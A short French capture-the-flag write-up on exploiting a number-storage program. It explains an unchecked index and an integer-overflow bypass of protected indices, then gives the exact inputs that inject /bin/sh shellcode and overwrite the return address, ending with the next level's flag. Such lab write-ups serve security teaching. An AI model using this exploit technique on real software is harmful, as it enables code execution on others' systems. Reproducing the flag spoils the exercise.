## GET Flag

Ce programme stoque des nombres dans un tableau dont certains index sont protégés (index % 3 == 0).
La première erreur de ce programme est de ne pas limiter l'index entré par l'utilisateur, il est donc possible d'entrer des nombres supérieur à 100 ou inféreur à 0.

De plus le décalage binaire effectué sur l'index permet de mettre des nombres divisibles par 3 (114 ~= 2147483762).
Malgré la randomisation de la stack, il est possible de lire l'adresse ou sont stoqués les nombres (-9).
Il est aussi possible de calculer l'emplacement de l'EIP (114).

Enfin malgré la réinitialisation de l'environnement il est possible d'injecter un shellcode via le `storage`.
En quittant le programme le shellcode sera executé.
 
```
storage[0 == 2147483648] = 0x6850c031 == 1750122545
storage[1] = 0x68732f2f == 1752379183
storage[2] = 0x69622f68 == 1768042344
sorage[3 == 2147483651] = 0x31e3896e = 836995438
storage[4] = 0x6aca89c9 = 1791658441
storage[5] = 0x80cd580b = 2160941067
storage[114 == 2147483762] = {read -9}
quit
```

### Flag

```
level08
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
